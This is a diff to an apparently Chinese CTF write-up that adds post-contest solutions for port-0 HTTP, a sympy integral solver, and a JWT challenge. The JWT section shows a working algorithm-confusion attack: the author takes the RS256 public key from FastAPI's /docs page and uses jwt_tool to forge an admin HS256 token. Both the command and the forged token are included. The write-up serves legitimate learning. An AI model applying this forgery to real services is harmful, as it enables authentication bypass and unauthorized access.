@@ -66,13 +66,13 @@ https://stackoverflow.com/questions/1364927/code-golf-reverse-quine
 
 注意代码是以双括号括起来的，所以print的end用双括号才能正常显示，单括号并不能显示出来。如果不修改end，代码会多出一个\n来。
 
-### reverse
+**reverse**
 
 ```
 x='x=%r;print((x%%x)[::-1],end="")';print((x%x)[::-1],end="")
 ```
 
-### sha256
+**sha256**
 
 ```
 x='x=%r;import hashlib;print(hashlib.sha256((x%%x).encode()).hexdigest(),end="")';import hashlib;print(hashlib.sha256((x%x).encode()).hexdigest(),end="")
@@ -162,20 +162,6 @@ plt.show()
 
 `flag{Fxurier_xptics_is_fun}`
 
-## 狗狗银行
-
-资产 - 负债 = 净资产->-inf
-
-0.3%  0.5%
-
-0.2% -> 正溢出
-
-正 - 正 = 正溢出
-
-正 - 负溢出
-
-
-
 ## 233同学的字符串工具
 
 python总有一些奇怪的特性。。
@@ -184,7 +170,7 @@ python总有一些奇怪的特性。。
 print('ﬂag'.upper())
 ```
 
-### uppercase
+**uppercase**
 
 本来想啃源码，后来搜了一下，搜出来了一些issue。
 
@@ -194,7 +180,7 @@ https://stackoverflow.com/questions/57190507/strange-behavior-of-pythons-upper-m
 
 `flag{badunic0debadbad_4e95509eaa}`
 
-### utf7
+**utf7**
 
 寻找了一大通找到这样一个网站
 
@@ -238,15 +224,9 @@ find()
 
 `flag{please_visit_www.utf8everywhere.org_c68fb2da99}`
 
-## 超基础的数理模拟器
-
-发现了一个库sympy，需要学习解定积分+输入latex公式
-
-
-
 ## 超安全的代理服务器
 
-### secret
+**secret**
 
 经过了很多失败的尝试：Fiddler一通抓，curl一通模拟，charles一通抓，全都失败了，不被识别为浏览器。http2可能有一些难以伪造的验证字段。
 
@@ -263,3 +243,105 @@ find()
 ![BhrZRO.png](https://s1.ax1x.com/2020/11/06/BhrZRO.png)
 
 `flag{d0_n0t_push_me}`
+
+## 从零开始的HTTP连接（赛后）
+
+尝试了改写curl源码、libc源码来去除0号端口的限制，都没有成功。
+
+网上查找资料给出了架设0号端口服务器的思路——使用IPtables转发，类似的思路也可以用于客户端，只需要一个正向代理即可，选用socat。（Mac的socat也不好使，需要用Linux）
+
+![BImeII.png](https://s1.ax1x.com/2020/11/07/BImeII.png)
+
+`flag{TCP_P0RT_0_1s_re5erved_BUT_w0rks_98af8a43d7}`
+
+## 从零开始的数理模拟器（赛后）
+
+由于sympy不够熟悉，以为算不了积分，没做出来...需要注意的点如下
+
++ Symbol要提前设置好，比如x和e，并且e要替换成sympy中的E(需要from sympy import E)
++ 定积分的latex不能直接运算，需要手动解析上下界，放入Integrate函数运算。
++ 因为传入的是被积函数，定积分latex后面的{d x}也要删除
++ latex中含有`\left,\right`一类字样，如果不处理的话，parse后是无法正确运算的！
+
+关键代码（解析latex、算积分）
+
+```python
+import requests
+from sympy import Integral, Symbol, E, latex
+from sympy.parsing.latex import parse_latex
+
+e = Symbol('e')
+x = Symbol('x')
+
+html = etree.HTML(t)
+latex = html.xpath("/html/body/div/div/div/center/p/text()")[0][2:-6]
+leftNum = int(html.xpath("/html/body/div/div/div/div[2]/div[2]/h1/text()")[0][1:-2])
+print("还剩"+str(leftNum)+"题",end="")
+m = latex
+
+#提取积分上下界
+lu = m.split(' ')[0]
+lower = lu[6:lu.find('^')-1]
+lower = parse_latex(lower).n(20)
+upper = lu[lu.find('^')+2:-1]
+upper = parse_latex(upper).n(20)
+
+# 对特殊字符处理
+m = ' '.join(m.split(' ')[1:])
+m = m.replace(r'\right)', ')').replace(r'\left(', '(').replace(r'\,', '')
+#替换e为E
+m = parse_latex(m).subs(e,E)
+print(m)
+ans = Integral(m, (x, lower, upper)).n(10)
+```
+
+400题后
+
+`flag{S0lid_M4th_Phy_Foundation_44938212dc}`
+
+
+
+## 普通的身份认证器（赛后）
+
+因为没有信息收集全面没有解出
+
+显然是jwt题，网搜一些jwt可知RS256的漏洞，关键点在于获取公钥。
+
+信息收集——FastApi，了解到 FastAPI 会给网站自动生成 API 文档，路径在 `/docs`
+
+![BoQqjP.png](https://s1.ax1x.com/2020/11/08/BoQqjP.png)
+
+于是访问可以看到公钥。
+
+![BoQXB8.md.png](https://s1.ax1x.com/2020/11/08/BoQXB8.md.png)
+
+存入文件myPublicKey
+
+```
+-----BEGIN RSA PUBLIC KEY-----
+MIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNF
+eNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvf
+ft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr
++xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonY
+M688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd
+46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/s
+eDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL
+3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5ns
+QcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXb
+pBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFv
+FCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ==
+-----END RSA PUBLIC KEY-----
+
+
+```
+
+使用jwt_tool生成可用的jwt即可（把guest改为admin）
+
+```
+python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDgxNTYzN30.2Hf7ZjkfUgV8sm3cS55Qf6MRLpA7Z2a5IpAJzsN6708" -S hs256 -kf myPublicKey 
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDgxNTYzN30.9Dw82TmoR4yzkD0DVxvma1n8zuvKnBEdiKpGIl5BnfE
+```
+
+`flag{just_A_simple_Json_Web_T0ken_exp1oit_470810}`
+
